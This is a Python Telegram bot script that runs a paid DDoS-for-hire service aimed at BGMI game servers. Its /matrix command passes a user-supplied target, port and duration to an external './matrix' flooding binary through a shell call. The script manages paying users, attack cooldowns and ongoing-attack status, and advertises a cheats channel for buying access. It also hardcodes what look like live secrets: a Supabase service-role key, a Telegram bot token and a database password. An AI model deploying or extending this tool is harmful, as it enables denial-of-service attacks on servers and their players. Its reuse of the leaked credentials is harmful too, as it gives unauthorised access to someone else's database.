#!/usr/bin/python3
# MADE BY @its_MATRIX_king
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time 
import logging
import socket
import pytz  # Import pytz for timezone handling
from supabase import create_client, Client
import psycopg2
import threading
import re

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

import os
url = os.getenv("https://yxffpwhflqaapiwcpknf.supabase.co")
key = os.getenv("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ")

# Supabase credentials (replace with your actual credentials)
url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
supabase: Client = create_client(url, key)

bot = telebot.TeleBot('7599785141:AAG1fV-LS6r6de3ngpeWXudCZYOIAo0GnM8')

# Setup timezone (IST)
IST = pytz.timezone('Asia/Kolkata')

# Database connection details
connection = psycopg2.connect(
    host="aws-0-ap-south-1.pooler.supabase.com",
    database="postgres",
    user="postgres.yxffpwhflqaapiwcpknf",
    password="Uthaya$4123",
    port=6543
)
cursor = connection.cursor()

USER_TABLE = "users"  # Replace with your actual table name

from datetime import datetime
import pytz

# Set up the timezone (Asia/Kolkata)
IST = pytz.timezone('Asia/Kolkata')

def save_user(user_id, expiration_time):
    try:
        expiration_time_str = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute(f"INSERT INTO {USER_TABLE} (user_id, expiration_time) VALUES (%s, %s)", (user_id, expiration_time_str))
        connection.commit()
    except Exception as e:
        logging.error(f"Error saving user {user_id}: {e}")
        connection.rollback()

# Function to read users from the database
def read_users():
    cursor.execute(f"SELECT user_id, expiration_time FROM {USER_TABLE}")
    users = cursor.fetchall()
    
    # Convert expiration_time to datetime and return a dictionary of users
    user_dict = {}
    for user_id, expiration_time in users:
        # Ensure expiration_time is timezone-aware
        if expiration_time.tzinfo is None:  # Check if naive (no timezone)
            expiration_time = IST.localize(expiration_time)  # Localize it to IST
        
        user_dict[user_id] = expiration_time
    return user_dict

# Handler for removing a user
def remove_expired_users():
    current_time = datetime.now(IST)  # Get the current time in IST
    try:
        # Delete users whose expiration time has passed
        cursor.execute(f"DELETE FROM {USER_TABLE} WHERE expiration_time < %s", (current_time.strftime("%Y-%m-%d %H:%M:%S"),))
        connection.commit()
    except Exception as e:
        logging.error(f"Error while removing expired users: {e}")
        print(f"Error while removing expired users: {e}")
        connection.rollback()  # Rollback the transaction on error

# Periodically check and remove expired users
def periodic_expiration_check(interval=60):
    while True:
        remove_expired_users()
        time.sleep(interval)

# Start periodic expiration check in a background thread
def start_periodic_expiration_check():
    expiration_thread = threading.Thread(target=periodic_expiration_check, args=(60,), daemon=True)
    expiration_thread.start()

# Call the function to start periodic expiration checks when the script is executed
start_periodic_expiration_check()
# Handler for adding a user
def parse_time_input(time_input):
    # Use regex to extract the number and unit (e.g., 1m, 2h, 3d)
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)

        if unit == "m":
            return timedelta(minutes=number)
        elif unit == "h":
            return timedelta(hours=number)
        elif unit == "d":
            return timedelta(days=number)
    return None

@bot.message_handler(commands=['add'])
def add_user(message):
    try:
        user_id = str(message.chat.id)

        if user_id in admin_owner:
            command = message.text.split()

            if len(command) == 3:
                user_to_add = command[1]
                time_input = command[2]

                # Parse the time input
                time_delta = parse_time_input(time_input)
                
                if time_delta:
                    # Calculate expiration time
                    expiration_time = datetime.now(IST) + time_delta
                    save_user(user_to_add, expiration_time)

                    response = (f"User {user_to_add} added successfully.\n"
                                f"Access valid for {time_input} (Expires at: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')} IST).")
                else:
                    response = "Error: Please specify a valid time format (e.g., 1m, 2h, 3d)."
            else:
                response = "Usage: /add <user_id> <time_in_format_m/h/d>"
        else:
            response = "Only Admin Can Run This Command."
        
        bot.reply_to(message, response)

    except Exception as e:
        logging.error(f"Error in /add command: {e}")
        bot.reply_to(message, "An error occurred while processing your request. Please try again.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    try:
        user_id = str(message.chat.id)

        if user_id in admin_owner:
            command = message.text.split()

            if len(command) == 2:
                user_to_remove = command[1]

                # Remove the user from the database
                cursor.execute(f"DELETE FROM {USER_TABLE} WHERE user_id = %s", (user_to_remove,))
                connection.commit()

                response = f"User {user_to_remove} has been removed successfully."
            else:
                response = "Usage: /remove <user_id>"
        else:
            response = "Only Admin Can Run This Command."

        bot.reply_to(message, response)

    except Exception as e:
        logging.error(f"Error in /remove command: {e}")
        bot.reply_to(message, "An error occurred while processing your request. Please try again.")


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        users = read_users()  # Fetch from Supabase
        response = "Authorized Users:\n"
        current_time = datetime.now(IST)

        active_users = [
            user_id for user_id, exp_time in users.items() if exp_time > current_time
        ]

        if active_users:
            for user_id in active_users:
                response += f"- {user_id} (Expires at: {users[user_id]})\n"
        else:
            response = "No active users found."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

#Store ongoing attacks globally
ongoing_attacks = []

# Store user attack tracking
user_attacks = {}

ongoing_attacks = {}  # Changed to dict to track per-user attacks

class UserAttackState:
    def __init__(self):
        self.active_attacks = 0
        self.cooldown_until = None

    def can_attack(self):
        current_time = datetime.now(IST)
        
        # If user is in cooldown, check if it's expired
        if self.cooldown_until and current_time < self.cooldown_until:
            return False, f"You are in cooldown. Wait until {self.cooldown_until.strftime('%H:%M:%S')}"
        
        # Check if user has reached attack limit
        if self.active_attacks >= 2:
            return False, "You already have 2 active attacks. Please wait for them to finish."
        
        return True, None

    def start_attack(self):
        self.active_attacks += 1
        
        # If this is the second attack, schedule the cooldown
        if self.active_attacks >= 2:
            self.schedule_cooldown()

    def end_attack(self):
        self.active_attacks = max(0, self.active_attacks - 1)
        
        # If all attacks are finished and cooldown was scheduled
        if self.active_attacks == 0 and self.cooldown_until:
            self.start_cooldown()

    def schedule_cooldown(self):
        # Schedule cooldown to start after attacks finish
        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)

    def start_cooldown(self):
        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
        self.active_attacks = 0

def execute_attack(message, user_id, attack_info, command):
    try:
        # Run attack command without capturing output - it will show in shell
        subprocess.run(command, shell=True, capture_output=False, text=True)
        
        # Remove attack from ongoing list
        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
            ongoing_attacks[user_id].remove(attack_info)
        
        # Update user's attack state
        if user_id in user_attacks:
            user_attacks[user_id].end_attack()
        
        # Only send completion notification
        bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King")
    except Exception as e:
        print(f"Error executing attack: {str(e)}")  # Print error to shell
        # Ensure attack is removed from tracking on error
        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
            ongoing_attacks[user_id].remove(attack_info)
        if user_id in user_attacks:
            user_attacks[user_id].end_attack()

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    user_id = str(message.chat.id)

    if user_id not in ongoing_attacks:
        ongoing_attacks[user_id] = []

    attack_info = {
        'user': username,
        'target': target,
        'port': port,
        'time': time,
        'start_time': datetime.now(IST)
    }
    
    ongoing_attacks[user_id].append(attack_info)

    if user_id in user_attacks:
        user_attacks[user_id].start_attack()

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
    bot.reply_to(message, response)

    full_command = f"./matrix {target} {port} {time}"
    try:
        print(f"\nExecuting attack command: {full_command}")  # Print to shell
        print(f"Attack started by user: {username} ({user_id})")  # Print to shell
        
        # Start attack in a separate thread
        attack_thread = threading.Thread(target=execute_attack, args=(message, user_id, attack_info, full_command))
        attack_thread.start()
        
    except Exception as e:
        print(f"Error starting attack: {str(e)}")  # Print to shell
        # Clean up attack record on error
        ongoing_attacks[user_id].remove(attack_info)
        user_attacks[user_id].end_attack()

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    remove_expired_users()
    user_id = str(message.chat.id)
    
    users = read_users()
    command = message.text.split()
    
    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"

    if user_id in admin_owner or user_id in users:
        if user_id in admin_owner:
            # Admin owner can bypass attack limits and cooldown
            if len(command) == 4:
                try:
                    target = command[1]
                    port = int(command[2])
                    time = int(command[3])

                    if time > 180:
                        response = "Error: Time interval must be 180 seconds or less"
                    else:
                        start_attack_reply(message, target, port, time)
                        return
                except ValueError:
                    response = "Error: Please ensure port and time are integers."
            else:
                response = "Usage: /matrix <target> <port> <time>"
        else:
            # Initialize attack state for user if not exists
            if user_id not in user_attacks:
                user_attacks[user_id] = UserAttackState()
            
            # Check if user can attack
            can_attack, error_message = user_attacks[user_id].can_attack()
            
            if can_attack:
                if len(command) == 4:
                    try:
                        target = command[1]
                        port = int(command[2])
                        time = int(command[3])

                        if time > 180:
                            response = "Error: Time interval must be 180 seconds or less"
                        else:
                            start_attack_reply(message, target, port, time)
                            return
                    except ValueError:
                        response = "Error: Please ensure port and time are integers."
                else:
                    response = "Usage: /matrix <target> <port> <time>"
            else:
                response = error_message

    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner or user_id in read_users():
        response = "Ongoing Attacks:\n\n"
        
        total_attacks = 0
        for user_id, attacks in ongoing_attacks.items():
            if attacks:
                total_attacks += len(attacks)
                for attack in attacks:
                    response += (f"User: {attack['user']}\nTarget: {attack['target']}\n"
                               f"Port: {attack['port']}\nTime: {attack['time']} seconds\n"
                               f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        if total_attacks == 0:
            response += "No ongoing attacks currently."
        
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to view the status.")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    users = read_users()
    user_name = message.from_user.first_name
    
    if user_id in admin_owner or user_id in users:
        response = f"""Welcome to Our BOT, {user_name}
🔰 Run This Command : /help
🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 BUY / OWNER - @its_MATRIX_King

✅ You are an authorized user with full access."""
    else:
        response = f"""⚠️ Unauthorized Access!

Dear {user_name},
You are not authorized to use this bot.
Please contact @its_MATRIX_King to purchase access.

🔰 Run /plan For Our Details
🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 Owner - @its_MATRIX_King"""

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)
        users = read_users()

        if user_id in admin_owner or user_id in users:
            # Help text for authorized users
            if user_id in admin_owner:
                help_text = '''✅ ADMIN COMMANDS:

🔰 /matrix - Execute BGMI server attack
🔰 /status - View ongoing attack details
🔰 /add - Add new user with time limit
🔰 /remove - Remove user access
🔰 /allusers - List all authorized users
🔰 /broadcast - Send message to all users
🔰 /rulesanduse - View usage guidelines
🔰 /plan - Check available plans
🔰 /id - Get your user ID

JOIN CHANNEL - @MATRIX_CHEATS
OWNER - @its_MATRIX_King'''
            else:
                help_text = '''✅ USER COMMANDS:

🔰 /matrix - Execute BGMI server attack
🔰 /status - View ongoing attack details
🔰 /rulesanduse - View usage guidelines
🔰 /plan - Check available plans
🔰 /id - Get your user ID

JOIN CHANNEL - @MATRIX_CHEATS
OWNER - @its_MATRIX_King'''
        else:
            help_text = '''⚠️ Unauthorized Access!

You do not have permission to view bot commands.
Please contact @its_MATRIX_King to purchase access.

🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 OWNER - @its_MATRIX_King'''

        bot.reply_to(message, help_text)
    
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "An error occurred while processing your request.")

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_id = str(message.chat.id)
    users = read_users()
    user_name = message.from_user.first_name
    
    if user_id in admin_owner or user_id in users:
        response = f'''✅ Rules & Usage Guidelines for {user_name}:

⚠️ IMPORTANT RULES:
1. Maximum attack time is 180 seconds
2. Always check /status before starting new attack
3. Wait for ongoing attacks to finish
4. Do not abuse the service

🔰 USAGE TIPS:
• Use correct port numbers
• Verify target before attack
• Follow cooldown periods
• Report any issues to admin

JOIN CHANNEL - @MATRIX_CHEATS
OWNER - @its_MATRIX_King'''
    else:
        response = f'''⚠️ Unauthorized Access!

Dear {user_name},
You do not have permission to view the rules.
Please contact @its_MATRIX_King to purchase access.

🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 OWNER - @its_MATRIX_King'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''💰 VIP PLANS & PRICING

Dear {user_name},
Contact @its_MATRIX_King for current plans and pricing.

✨ BENEFITS:
• Premium Support
• Priority Access
• Extended Features
• Reliable Service

🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 OWNER - @its_MATRIX_King'''
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f'''🆔 USER IDENTIFICATION

Your Telegram ID: {user_id}

Use this ID when purchasing access.
Contact @its_MATRIX_King for activation.'''
    
    bot.reply_to(message, response)

def check_authorization(user_id):
    """Helper function to check if user is authorized"""
    users = read_users()
    return user_id in admin_owner or user_id in users

def unauthorized_message(user_name):
    """Helper function to generate unauthorized message"""
    return f'''⚠️ Unauthorized Access!

Dear {user_name},
You do not have permission to use this command.
Please contact @its_MATRIX_King to purchase access.

🔰 JOIN CHANNEL - @MATRIX_CHEATS
🔰 OWNER - @its_MATRIX_King'''

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @MATRIX_CHEATS
        Owner/Buy - @its_Matrix_King
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)


# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot

if __name__ == "__main__":
    run_bot()
